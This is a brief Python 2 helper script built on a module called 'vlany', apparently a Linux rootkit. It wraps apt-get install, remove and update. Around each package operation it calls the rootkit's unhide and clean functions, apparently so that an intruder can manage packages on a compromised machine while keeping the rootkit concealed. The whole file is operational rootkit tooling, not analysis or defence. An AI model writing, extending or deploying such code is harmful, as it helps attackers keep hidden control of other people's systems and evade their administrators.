#!/usr/bin/env python2

import vlany
import os
import sys

if not len(sys.argv) >= 2: quit()

pkg_man_name = "apt-get"
install_args = [pkg_man_name, "install"]
rm_args = [pkg_man_name, "remove"]
u_args = [pkg_man_name, "update"]

if __name__ == "__main__":
    o_gid = vlany.getgid()
    o_dir = vlany.cwd()
    vlany.relocate("/")
    vlany.unhide(0)

    if sys.argv[1] == "install":
        vlany.install_pkg(install_args[0], install_args[1], sys.argv[2])
    elif sys.argv[1] == "remove":
        vlany.rm_pkg(rm_args[0], rm_args[1], sys.argv[2])
    elif sys.argv[1] == "update":
        vlany.update_pkg_man(u_args[0], u_args[1])
    else:
        print("[-] {0} is not an acceptable operation argument".format(sys.argv[1]))

    vlany.clean(o_gid)
    vlany.relocate(o_dir)
